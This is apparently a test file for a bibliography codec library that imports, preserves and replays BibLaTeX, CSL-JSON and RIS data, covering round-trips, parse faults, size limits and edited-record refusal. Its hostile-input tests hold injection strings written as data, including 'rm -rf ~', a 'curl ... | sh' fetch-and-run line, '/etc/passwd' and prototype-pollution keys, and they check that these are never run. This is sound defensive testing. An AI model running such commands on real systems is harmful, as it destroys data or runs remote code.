// US-015 and CONTRACT-003 B, C, G: the library codecs. Every name, title, and
// entry here is invented.
import { describe, expect, test } from "bun:test";
import { replayBatch } from "../packages/intake/src/legacy-export.ts";
import { importLibrary, type ImportOptions, type ImportResult } from "../packages/intake/src/legacy-import.ts";
import { texToText } from "../packages/intake/src/legacy-tex.ts";
import { LEGACY_LIMITS, type LegacyFormat, type Limits } from "../packages/intake/src/legacy.ts";
import { canonical, digest, isObject, type JsonObject, parseJson, recordPath, validateRecord } from "../packages/records/src/index.ts";
import { information, jsonInformation } from "./legacy-compare.ts";

const bytes = (text: string) => new TextEncoder().encode(text);

function run(format: LegacyFormat, text: string | Uint8Array, more: Partial<ImportOptions> = {}): ImportResult {
  let n = 0;
  return importLibrary(typeof text === "string" ? bytes(text) : text, {
    format, fileName: `/somewhere/private/library.${format}`, at: "2026-11-26T10:00:00Z",
    actor: { kind: "software", name: "test" }, newId: (prefix) => `${prefix}${String(++n).padStart(20, "0")}`, ...more,
  });
}

function imported(format: LegacyFormat, text: string, more: Partial<ImportOptions> = {}) {
  const result = run(format, text, more);
  if (result.status !== "imported") throw new Error(JSON.stringify(result));
  return result;
}

function failed(format: LegacyFormat, text: string | Uint8Array, limits?: Partial<Limits>) {
  const result = run(format, text, limits ? { limits: { ...LEGACY_LIMITS, ...limits } } : {});
  if (result.status !== "failed") throw new Error(`expected a failure, got ${result.status}`);
  return result;
}

const list = (value: unknown) => (Array.isArray(value) ? value.filter(isObject) : []);
const legacy = (source: JsonObject) => list(source.legacy)[0]!;
/** One preserved value of one entry, by native name. */
const kept = (source: JsonObject, name: string) =>
  list(legacy(source).fields).filter((f) => f.native_path === name).map((f) => f.value);

/** The records as a project would hold them: written in canonical form and read back. */
function stored(records: JsonObject[]): JsonObject[] {
  return records.map((record) => {
    const read = parseJson(canonical(record));
    expect(read.forbidden).toEqual([]);
    expect(validateRecord(read.value, recordPath(String(record.kind), String(record.id))).problems).toEqual([]);
    return read.value as JsonObject;
  });
}

/** Import, store, replay, and compare the information (CONTRACT-003 C). */
function roundTrip(format: LegacyFormat, original: string) {
  const result = imported(format, original);
  const [batch, ...sources] = stored([result.batch, ...result.sources]);
  const replay = replayBatch(batch!, sources);
  if (replay.status !== "written") throw new Error(JSON.stringify(replay));
  expect(information(format, replay.text)).toEqual(information(format, original));
  return { result, text: replay.text, batch: batch!, sources, loss: replay.loss };
}

const BIB = String.raw`% Invented library, kept by hand.
@preamble{ "\newcommand{\noop}[1]{}" }
@string{ijw = {Invented Journal of Water}}
@STRING(press = "Invented " # {Press})
@string{unused = "never used"}

A note between entries, with an address someone@example.org in it.

@comment{ @book{hidden, title = {Not an entry}} }

@Article{adair2017,
  Author       = {Adair, John and Karen van der Brel and {Office of Invented Water} and others},
  title        = "Rivers and {Their} Names: {\'E}tudes",
  journaltitle = ijw # ", Series " # 2,
  year         = 2017,
  month        = mar,
  x-fieldcode  = {AB12},
  keywords     = {fords},
  keywords     = {weirs},
  doi          = {10.5555/invented.1},
  file         = {Full text:/Users/someone/Library/adair.pdf:application/pdf},
  % check translator
}
@book(corso2001,
  title     = {Locks, 50\% rebuilt},
  publisher = press,
  date      = {2001-05/2002},
  series    = unknownseries # { II},
)
% @book{commented, title = {Commented out}}
@xdata{shared, location = {Leeds}}
@incollection{dunmore,
  crossref = {corso2001},
  title = {A \emph{short} chapter},
  author = {family=Dunmore, given=Pia, prefix=de},
}
`;

describe("US-015-AC1: BibLaTeX", () => {
  test("keeps unknown fields, comments, macros, and repeated fields", () => {
    const { result, batch, sources } = roundTrip("biblatex", BIB);
    const [adair, corso] = sources;
    expect(kept(adair!, "x-fieldcode")).toEqual(["AB12"]);
    expect(kept(adair!, "keywords")).toEqual(["fords", "weirs"]);
    expect(kept(adair!, "journaltitle")).toEqual(["Invented Journal of Water, Series 2"]);
    expect(kept(adair!, "title")).toEqual([String.raw`Rivers and {Their} Names: {\'E}tudes`]);
    expect(kept(adair!, "month")).toEqual(["mar"]);
    expect(kept(corso!, "publisher")).toEqual(["Invented Press"]);
    expect(kept(corso!, "series")).toEqual(["unknownseries # { II}"]);
    expect(legacy(adair!)).toMatchObject({ native_key: "adair2017", native_type: "Article", ordinal: 0 });
    expect(String(legacy(corso!).entry_text)).toStartWith("@book(corso2001,");

    const blocks = list(batch.blocks).map((b) => `${b.kind}: ${b.text}`);
    expect(blocks).toContain("comment: % check translator");
    expect(blocks).toContain("comment: @comment{ @book{hidden, title = {Not an entry}} }");
    expect(blocks).toContain('string_definition: @string{unused = "never used"}');
    expect(blocks.join("\n")).toContain("someone@example.org");
    expect(blocks.join("\n")).toContain("% @book{commented, title = {Commented out}}");
    expect(blocks).toContain(String.raw`preamble: @preamble{ "\newcommand{\noop}[1]{}" }`);
    expect(result.sources).toHaveLength(4);
    expect(result.batch).toMatchObject({ format: "biblatex", entry_count: 4, original_name: "library.biblatex" });
  });

  test("maps what it can read, and says what it did not", () => {
    const { result, sources } = roundTrip("biblatex", BIB);
    const [adair, corso, xdata, dunmore] = sources;
    expect(adair).toMatchObject({
      citation_key: "adair2017", type: "article-journal", intake: "parsed", admission: "candidate",
      title: { value: "Rivers and Their Names: Études" }, issued: { edtf: "2017-03" },
      identifiers: [{ scheme: "doi", value: "10.5555/invented.1" }],
    });
    expect(list(adair!.contributions).map((c) => c.as_printed)).toEqual([
      { family: "Adair", given: "John" },
      { given: "Karen", particle: "van der", family: "Brel" },
      { literal: "Office of Invented Water" },
    ]);
    expect(corso).toMatchObject({
      title: { value: "Locks, 50% rebuilt" }, issued: { edtf: "2001-05/2002" },
      bib: [{ name: "publisher", value: { value: "Invented Press" } }],
    });
    expect(dunmore).toMatchObject({ type: "chapter", title: { value: "A short chapter" }, contributions: [{ role: "author", as_printed: { family: "Dunmore", given: "Pia", particle: "de" } }] });
    const title = list(legacy(adair!).fields).find((f) => f.native_path === "title")!;
    expect(title).toMatchObject({ mapped_to: "title", mapped_sha256: digest(adair!.title) });

    expect(result.report.inherits).toEqual([String(dunmore!.id)]);
    expect(result.report.not_single_works).toEqual([String(xdata!.id)]);
    expect(result.report.unrecognized_types).toEqual([{ record: String(xdata!.id), type: "xdata" }]);
    expect(result.report.local_paths).toEqual([{ record: String(adair!.id), native_path: "file" }]);
    expect(JSON.stringify(result.report)).not.toContain("/Users/");
    expect(result.report.unmapped_fields).toContainEqual({ name: "x-fieldcode", count: 1 });
    expect(result.report.notes.map((n) => `${n.code}${n.name ? ` ${n.name}` : ""}`).sort())
      .toEqual(["comment_in_entry", "repeated_field keywords", "undefined_macro unknownseries"]);
    const losses = list(result.batch.losses).map((l) => `${l.path} ${l.class}`);
    expect(losses).toContain("entries[0]/Author approximated");
    expect(losses).toContain("entries[3]/title approximated");
    expect(losses).toContain("entries[1]/series unrepresented");
  });

  test("keeps a definition after the entries when a value must stay unexpanded", () => {
    const { text, sources } = roundTrip("biblatex", "@book{a, publisher = later}\n@string{later = {Late Press}}\n@book{b, publisher = later}\n");
    expect(text.indexOf("@string")).toBeGreaterThan(text.indexOf("@book{b"));
    expect(kept(sources[1]!, "publisher")).toEqual(["Late Press"]);
    expect(sources[0]!.bib).toBeUndefined();
  });

  const pandoc = Bun.which("pandoc");
  test.skipIf(!pandoc)("a second reader, Pandoc, reads the original and the replay alike", () => {
    // Kept to what Pandoc reads: brace delimiters, defined macros, and no `@` between entries.
    const original = String.raw`% A comment.
@string{ijw = {Invented Journal of Water}}
@string{press = "Invented " # {Press}}
@article{adair2017,
  author = {Adair, John and Karen van der Brel and {Office of Invented Water}},
  title = "Rivers and {Their} Names: {\'E}tudes",
  journaltitle = ijw # ", Series " # 2,
  year = 2017, month = mar, keywords = {fords}, x-fieldcode = {AB12},
}
@book{corso2001, title = {Locks, 50\% rebuilt}, publisher = press, date = {2001-05/2002}}
`;
    const { text } = roundTrip("biblatex", original);
    const read = (input: string) => {
      const done = Bun.spawnSync([pandoc!, "-f", "biblatex", "-t", "csljson"], { stdin: bytes(input) });
      expect(done.exitCode).toBe(0);
      return (JSON.parse(done.stdout.toString()) as { id: string }[]).sort((a, b) => (a.id < b.id ? -1 : 1));
    };
    expect(read(text)).toHaveLength(2);
    expect(read(text)).toEqual(read(original));
  });

  test("reads CRLF", () => {
    roundTrip("biblatex", BIB.replaceAll("\n", "\r\n"));
  });
});

describe("TeX to text", () => {
  test.each([
    [String.raw`G{\"o}del and Erd\H{o}s`, "Gödel and Erdős"],
    [String.raw`Fran\c{c}ois \v Capek`, "François Čapek"],
    [String.raw`\'{\i} na\"\i ve \o\ss`, "í naïve øß"],
    [String.raw`pp.~1--2 --- ` + "``so''", "pp. 1–2 — “so”"],
    [String.raw`A \& B \_ {C}`, "A & B _ C"],
  ])("reads %s", (tex, text) => expect(texToText(tex)).toEqual({ text, approximated: false }));
  test.each([String.raw`\input{secrets}`, String.raw`\write18{rm -rf ~}`, "$x^2$", String.raw`\LaTeX{}`, String.raw`a\'`])
    ("gives nothing for %s", (tex) => expect(texToText(tex)).toBeUndefined());
});

const CSL = `[
  {
    "id": "brel2003", "type": "book", "title": "Weirs of the north", "x-shelf": "R4",
    "note": "two\\r\\nlines", "volume": 2.50, "number-of-pages": 1e3,
    "author": [{"family": "Brel", "given": "Karen", "non-dropping-particle": "van"}, {"literal": "Office of Invented Water"}],
    "issued": {"date-parts": [["2003", 6]]}, "accessed": {"raw": "last June"},
    "DOI": "10.5555/invented.2", "custom": {"__proto__": [null, true, {"n": 0.10}]}
  },
  {"type": "chapter", "id": 7, "title": "Fords", "issued": {"date-parts": [[1999]], "season": 2}, "title-short": "F\\u00f6rds"},
  {"id": "http://example.invalid/items/9", "type": "x-invented"}
]
`;

describe("US-015-AC2: CSL-JSON", () => {
  test("keeps every member, number text, and null", () => {
    const { result, sources, text } = roundTrip("csl_json", CSL);
    const [brel, fords, odd] = sources;
    expect(kept(brel!, "volume")).toEqual(["2.50"]);
    expect(kept(brel!, "custom")).toEqual(['{"__proto__": [null, true, {"n": 0.10}]}']);
    expect(text).toContain("1e3");
    expect(brel).toMatchObject({
      citation_key: "brel2003", type: "book", issued: { edtf: "2003-06" },
      dates: [{ variable: "accessed", date: { literal: "last June" } }],
      identifiers: [{ scheme: "doi", value: "10.5555/invented.2" }],
    });
    expect(list(brel!.bib)).toContainEqual({ name: "volume", value: { value: "2.50" } });
    expect(list(brel!.contributions)[0]!.as_printed).toEqual({ family: "Brel", given: "Karen", particle: "van" });
    expect(fords!.issued).toBeUndefined();
    expect(legacy(fords!)).toMatchObject({ native_key: "7" });
    // A row number or an address is not made into a citation key.
    expect(result.report.without_key).toEqual([String(fords!.id), String(odd!.id)]);
    expect(result.report.unrecognized_types).toEqual([{ record: String(odd!.id), type: "x-invented" }]);
  });

  test("replays an id and type that hold CRLF, which records save as LF", () => {
    roundTrip("csl_json", '[{"id": "a\\r\\nb", "type": "c\\r\\nd"}]');
  });

  test("the comparator sees a changed number, order, or null", () => {
    for (const [a, b] of [['{"a":1.0}', '{"a":1}'], ["[1,2]", "[2,1]"], ['{"a":null}', "{}"]]) {
      expect(jsonInformation(a!)).not.toBe(jsonInformation(b!));
    }
    expect(jsonInformation('{"a":1,"b":"\\u00e9"}')).toBe(jsonInformation('{ "b": "é", "a": 1 }'));
  });
});

/** Spaces at the end of a line, which editors tend to strip from source. */
const SPACES = "  ";
const RIS = `Provider: Invented Database
Content: text/plain

TY  - JOUR
ID  - corso1998
AU  - Corso, Lee
AU  - Brel, Karen
AU  - Office of Invented Water
TI  - Sluices
T2  - Invented Journal of Water
PY  - 1998/04//
VL  - 12
SP  - 40
EP  - 57
Z9  - kept as it is${SPACES}
N1  - first note
continued, with its spacing${SPACES}

    and an indented line after an empty one

N1  - second note
SN  - 1234-567X
L1  - file:///Users/someone/corso.pdf
KW  - weirs
KW  - fords
ER  -

1.

TY  - XYZZY
T1  - Untitled
AB  -
ER  -
`;

describe("US-015-AC3: RIS", () => {
  test("keeps unknown tags, repeated tags, continuation lines, and file text", () => {
    const { result, batch, sources } = roundTrip("ris", RIS);
    const [corso, other] = sources;
    expect(kept(corso!, "Z9")).toEqual([`kept as it is${SPACES}`]);
    expect(kept(corso!, "N1")).toEqual([`first note\ncontinued, with its spacing${SPACES}\n\n    and an indented line after an empty one`, "second note"]);
    expect(kept(corso!, "KW")).toEqual(["weirs", "fords"]);
    expect(list(batch.blocks).map((b) => [b.kind, b.text])).toEqual([["header", "Provider: Invented Database\nContent: text/plain"], ["other", "1."]]);
    expect(corso).toMatchObject({
      citation_key: "corso1998", type: "article-journal", title: { value: "Sluices" }, issued: { edtf: "1998-04" },
      identifiers: [{ scheme: "issn", value: "1234-567X" }],
    });
    expect(list(corso!.bib)).toContainEqual({ name: "page", value: { value: "40-57" } });
    // Two notes have no single home in the record; neither is chosen.
    expect(list(corso!.bib).map((b) => b.name)).not.toContain("note");
    expect(list(corso!.contributions).map((c) => c.as_printed)).toEqual([
      { family: "Corso", given: "Lee" }, { family: "Brel", given: "Karen" }, { literal: "Office of Invented Water" },
    ]);
    expect(result.report.variant).toBe("tagged, with continuation lines");
    expect(result.report.local_paths).toEqual([{ record: String(corso!.id), native_path: "L1" }]);
    expect(result.report.unrecognized_types).toEqual([{ record: String(other!.id), type: "XYZZY" }]);
  });

  test("reads CRLF and a byte-order mark", () => {
    const { sources } = roundTrip("ris", `﻿${RIS.replaceAll("\n", "\r\n")}`);
    expect(String(kept(sources[0]!, "N1")[0])).not.toContain("\r");
  });

  test("reports a line that looks like a tag inside a record", () => {
    const result = imported("ris", "TY  - BOOK\nAB  - text\nAU - Brel, Karen\nER  - \n");
    expect(result.report.notes).toMatchObject([{ code: "line_like_a_tag", line: 3 }]);
    expect(kept(result.sources[0]!, "AB")).toEqual(["text\nAU - Brel, Karen"]);
  });
});

describe("US-015-AC5: faults name their lines and nothing is returned", () => {
  test("an unclosed brace in the second of three entries", () => {
    const result = failed("biblatex", "@book{a, title = {One}}\n\n@book{b,\n  title = {Two,\n  year = 2001\n}\n\n@book{c, title = {Three}}\n");
    expect(result.code).toBe("import_parse_error");
    expect(result.faults).toMatchObject([{ line: 3, entry: "b" }]);
    expect(result.entries).toEqual({ read: 2, unread: 1 });
    expect(result).not.toHaveProperty("sources");
  });

  test("several faults are named at once", () => {
    const result = failed("biblatex", "@book{a, title {One}}\n@book{, title = {x}}\n@book{c, title = {ok}}\n@book d,\n@book{e, title = \"open\n");
    expect(result.faults.map((f) => [f.code, f.line, f.entry])).toEqual([
      ["missing_equals", 1, "a"], ["missing_key", 2, undefined], ["missing_opening", 4, undefined], ["unclosed_quote", 5, "e"],
    ]);
    expect(result.entries).toEqual({ read: 1, unread: 4 });
  });

  test("an entry closed too early is noted", () => {
    const result = imported("biblatex", "@book{a, title = {One}}\n  year = {2001},\n}\n");
    expect(result.report.notes).toMatchObject([{ code: "text_like_a_field", line: 2 }]);
  });

  test.each([
    ["TY - BOOK\nTI  - x\nER  - \n", [["tag_outside_record", 1]], 0],
    ["TY  - BOOK\nTI  - x\nTY  - BOOK\nER  - \n", [["missing_end", 1]], 1],
    ["TY  - BOOK\nTI  - x\n", [["missing_end", 1]], 0],
    ["TY  - BOOK\nstray\nTI  - x\nER  - \nAU  - Late\n", [["unplaced_line", 2], ["tag_outside_record", 5]], 0],
  ])("RIS %j", (text, expected, read) => {
    const result = failed("ris", text);
    expect(result.faults.map((f) => [f.code, f.line])).toEqual(expected as [string, number][]);
    // A record with a fault is never counted as read.
    expect(result.entries!.read).toBe(read as number);
    expect(result.entries!.unread).toBeGreaterThan(0);
  });

  test("CSL-JSON duplicate members, with the item's key found later", () => {
    const result = failed("csl_json", '[\n {"title": "a",\n  "title": "b", "id": "k1"},\n {"id": "k2", "x": {"y": 1, "y": 2}},\n 5\n]');
    expect(result.faults.map((f) => [f.code, f.line, f.entry, f.name])).toEqual([
      ["duplicate_member", 3, "k1", "title"], ["duplicate_member", 4, "k2", "y"], ["not_an_item", 5, undefined, undefined],
    ]);
    expect(result.entries).toEqual({ read: 0, unread: 3 });
  });

  test.each([
    ['[{"id": "a"},\n {"id": "b",}]', "json_syntax", 2],
    ['[{"id": "a"}]\nmore', "trailing_text", 2],
    ['{"id": "a"}', "not_an_array", 1],
    ['[{"id": "\\ud800"}]', "lone_surrogate", 1],
    ['[{"id": "a", "title": "x\ny"}]', "json_syntax", 1],
    ["", "not_an_array", 1],
  ])("CSL-JSON %j", (text, code, line) => expect(failed("csl_json", text).faults[0]).toMatchObject({ code, line }));

  test("bytes that are not UTF-8", () => {
    const result = failed("biblatex", new Uint8Array([...bytes("@book{a,\n title = {"), 0xe9, ...bytes("}}\n")]));
    expect(result.faults).toMatchObject([{ code: "not_utf8", line: 2 }]);
  });
});

describe("US-015-AC6 and CONTRACT-003 G: hostile input", () => {
  test("a command is kept as text and never mapped or run", () => {
    const title = String.raw`\immediate\write18{curl http://example.invalid | sh}`;
    const { sources } = roundTrip("biblatex", `@book{evil, title = {${title}}, url = {file:///etc/passwd}}\n`);
    expect(kept(sources[0]!, "title")).toEqual([title]);
    expect(sources[0]!.title).toBeUndefined();
  });

  const input = (name: string, format: LegacyFormat, text: string, limits: Partial<Limits>, limit: keyof Limits) =>
    test(name, () => {
      const result = failed(format, text, limits);
      expect(result.code).toBe("input_limit");
      expect(result.faults[0]!.name).toBe(limit);
    });
  input("a file too large", "ris", RIS, { fileBytes: 10 }, "fileBytes");
  for (const [format, text] of [["biblatex", "@a{a}\n@a{b}\n@a{c}\n"], ["ris", "TY  - A\nER  - \n".repeat(3)], ["csl_json", "[{},{},{}]"]] as const) {
    input(`too many ${format} entries`, format, text, { entries: 2 }, "entries");
  }
  input("braces too deep", "biblatex", `@a{a, t = ${"{".repeat(100_000)}`, {}, "depth");
  input("braces too deep in a comment", "biblatex", `@comment${"{".repeat(100_000)}`, {}, "depth");
  input("JSON too deep", "csl_json", `[{"a": ${"[".repeat(100_000)}`, {}, "depth");
  input("a long BibLaTeX value", "biblatex", `@a{a, t = {${"x".repeat(200)}}}`, { fieldBytes: 100 }, "fieldBytes");
  input("a long CSL-JSON value", "csl_json", `[{"t": "${"x".repeat(200)}"}]`, { fieldBytes: 100 }, "fieldBytes");
  input("a RIS value long over many lines", "ris", `TY  - A\nAB  - x\n${"yyyyyyyyyy\n".repeat(50)}ER  - \n`, { fieldBytes: 100 }, "fieldBytes");
  input("a long value in bytes, not characters", "csl_json", `[{"t": "${"é".repeat(60)}"}]`, { fieldBytes: 100 }, "fieldBytes");

  test("macros that double each time stop at the field limit", () => {
    const strings = Array.from({ length: 60 }, (_, i) => `@string{m${i + 1} = m${i} # m${i}}`).join("\n");
    expect(failed("biblatex", `@string{m0 = {0123456789}}\n${strings}\n`).faults[0]!.name).toBe("fieldBytes");
  });

  test("one large macro used many times stops at the expanded total", () => {
    const text = `@string{big = {${"x".repeat(1000)}}}\n@a{a, ${Array.from({ length: 100 }, (_, i) => `f${i} = big`).join(", ")}}\n`;
    expect(failed("biblatex", text, { expandedUnits: 50_000 }).faults[0]!.name).toBe("expandedUnits");
  });

  test("an unclosed brace before a long file is a parse fault, not a limit", () => {
    const rest = Array.from({ length: 20 }, (_, i) => `@book{k${i}, title = {t}}`).join("\n");
    const result = failed("biblatex", `@book{a, title = {open}\n${rest}\n`, { fieldBytes: 200 });
    expect(result.code).toBe("import_parse_error");
    expect(result.faults[0]).toMatchObject({ line: 1, entry: "a" });
  });

  test("the list of faults is capped and says so", () => {
    const result = failed("biblatex", "@book{a title}\n".repeat(500));
    expect(result.faults).toHaveLength(LEGACY_LIMITS.faults);
    expect(result.more).toBe(true);
  });

  // Reading must stay close to linear in the file's size.
  test.each([
    ["biblatex", "@".repeat(200_000)],
    ["biblatex", `${" ".repeat(200_000)}@`],
    ["biblatex", `@a{a, author = {${"a and ".repeat(30_000)}b${" ".repeat(100_000)}}}`],
    ["biblatex", "x}\n".repeat(50_000)],
    ["biblatex", "% c\n".repeat(50_000)],
    ["ris", `TY  - A\nAB  - x\n${"\n".repeat(100_000)}ER  - \n`],
    ["ris", `TY  - A\nAB  - ${" ".repeat(500_000)}-\nER  - \n`],
    ["csl_json", `[{"f": "/${" ".repeat(500_000)}"}]`],
    ["biblatex", `x\n${" ".repeat(500_000)}y\n@a{a}\n`],
    ["biblatex", `@a{a, author = {b${" ".repeat(500_000)}c}}`],
    ["biblatex", `@a{a, author = {${"a and ".repeat(100_000)}b}}`],
    ["ris", `TY  - A\n${"AU  - Brel, K.\n".repeat(40_000)}ER  - \n`],
  ] as const)("reads hostile %s quickly (%#)", (format, text) => {
    const from = performance.now();
    run(format, text);
    expect(performance.now() - from).toBeLessThan(4000);
  });

  test("names that look like object internals stay ordinary", () => {
    roundTrip("csl_json", '[{"id": "constructor", "type": "toString", "__proto__": 1, "hasOwnProperty": 2}]');
    roundTrip("biblatex", "@constructor{__proto__, toString = valueOf, __proto__ = {x}}\n");
    roundTrip("ris", "TY  - constructor\nER  - \n");
  });
});

describe("CONTRACT-003 B: records, keys, duplicates, and repeats", () => {
  const two = "@book{Same, title = {A Title}, author = {Brel, K.}, year = 2000}\n@book{same, title = {A title!}, author = {Brel, Karen}, year = 2000}\n@book{taken, doi = {10.5/X}}\n@book{free, doi = {https://doi.org/10.5/x}}\n";

  test("colliding keys go to no record, and possible duplicates are not merged", () => {
    const { report, sources } = imported("biblatex", two, { keysInUse: ["TAKEN"] });
    stored(sources);
    expect(sources.map((s) => s.citation_key)).toEqual([undefined, undefined, undefined, "free"]);
    expect(report.key_collisions.map((c) => [c.key, c.records.length, c.in_use])).toEqual([["Same", 2, false], ["taken", 1, true]]);
    expect(report.possible_duplicates.map((d) => [d.reason, d.records.length])).toEqual([["same_doi", 2], ["same_title_author_year", 2]]);
    expect(sources.map((s) => (legacy(s).native_key))).toEqual(["Same", "same", "taken", "free"]);
  });

  test("the same bytes are not imported twice unless asked", () => {
    const first = imported("biblatex", two);
    const earlier = [first.batch as { id: string; original_sha256: string }];
    expect(run("biblatex", two, { earlier })).toEqual({ status: "already_imported", sha256: String(first.batch.original_sha256), batches: [String(first.batch.id)] });
    expect(run("biblatex", two, { earlier, again: true }).status).toBe("imported");
  });

  test("a local path is preserved and never copied into a record's own fields", () => {
    for (const [format, text] of [
      ["biblatex", "@online{a, url = {file:///Users/someone/a.html}, title = {T}}\n"],
      ["ris", "TY  - ELEC\nUR  - file:///home/someone/a.html\nTI  - T\nER  - \n"],
      ["csl_json", '[{"id": "a", "type": "webpage", "title": "T", "URL": "/Users/someone/a.html"}]'],
    ] as const) {
      const { sources } = roundTrip(format, text);
      const { legacy: _, ...own } = sources[0]!;
      expect(JSON.stringify(own)).not.toContain("someone");
      expect(own.title).toEqual({ value: "T" });
    }
  });

  test("a path in the middle of a web address is not a local path", () => {
    const { report } = imported("biblatex", "@online{a, url = {https://example.org/home/x}, note = {See http://x.invalid/tmp/ a:b}}\n@misc{b, file = {x:C\\:\\\\papers\\\\a.pdf:PDF}}\n@misc{c, file = {~/a.pdf}}\n");
    expect(report.local_paths.map((p) => p.native_path)).toEqual(["file", "file"]);
  });
});

describe("CONTRACT-003 C, D: replay", () => {
  const text = "@book{a, title = {One}, x-shelf = {R4}}\n@book{b, title = {Two}}\n";

  test("writes nothing when a record has been edited, and names where", () => {
    const { batch, sources } = imported("biblatex", text);
    const [a, b] = sources;
    const edited = { ...a!, title: { value: "Changed" }, bib: [{ name: "publisher", value: { value: "New" } }], citation_key: "z", key_aliases: ["a"] };
    expect(replayBatch(batch, [edited, b!])).toEqual({
      status: "export_unsupported", edited: [{ record: String(a!.id), paths: ["title", "bib/publisher", "citation_key"] }],
    });
    const removed = { ...b! };
    delete removed.title;
    expect(replayBatch(batch, [a!, removed])).toMatchObject({ status: "export_unsupported", edited: [{ paths: ["title"] }] });
    expect(replayBatch(batch, [a!, { ...b!, type: "report" }])).toMatchObject({ status: "export_unsupported", edited: [{ paths: ["type"] }] });
  });

  test("leaves out retired records and reports record fields the format cannot hold", () => {
    const { batch, sources } = imported("biblatex", text);
    const [a, b] = sources;
    const result = replayBatch(batch, [{ ...b!, retired: { reason: "x" } }, { ...a!, tags: ["checked"] }]);
    if (result.status !== "written") throw new Error(result.status);
    expect(result.text).not.toContain("Two");
    expect(result.loss).toEqual({
      schema: "stemma.loss-report/0", target: "biblatex",
      records: [
        { record: String(b!.id), items: [{ path: "", class: "unrepresented", note: "A retired source is not exported." }] },
        { record: String(a!.id), items: [{ path: "tags", class: "unrepresented" }] },
      ],
    });
  });

  test("refuses a batch from another codec version", () => {
    const { batch, sources } = imported("biblatex", text);
    expect(replayBatch({ ...batch, codec: { name: "stemma-biblatex", version: "99" } }, sources)).toEqual({ status: "codec_incompatible", version: "99" });
  });

  test("withholds text that would not read back as what was preserved", () => {
    const { batch, sources } = imported("biblatex", text);
    const spoiled = structuredClone(sources);
    const field = list(legacy(spoiled[0]!).fields).find((f) => f.native_path === "x-shelf")!;
    field.value = "R4}, injected = {1";
    expect(replayBatch(batch, spoiled)).toEqual({ status: "replay_mismatch" });
  });

  test("a character Unicode calls space is not trimmed from a comment", () => {
    roundTrip("biblatex", "\u2028@home} text\n@a{k}\n");
  });

  test("empty libraries", () => {
    for (const [format, empty] of [["csl_json", "[]"], ["biblatex", ""], ["ris", ""]] as const) roundTrip(format, empty);
  });
});
